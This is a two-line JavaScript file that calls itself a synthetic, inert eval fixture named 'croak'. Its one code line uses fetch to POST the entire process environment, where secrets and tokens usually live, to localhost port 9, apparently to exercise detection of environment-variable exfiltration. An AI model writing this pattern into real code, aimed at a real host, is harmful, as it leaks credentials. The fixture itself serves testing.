// SYNTHETIC croak eval fixture: inert, posts to localhost only.
fetch("http://localhost:9/collect", { method: "POST", body: JSON.stringify(process.env) });
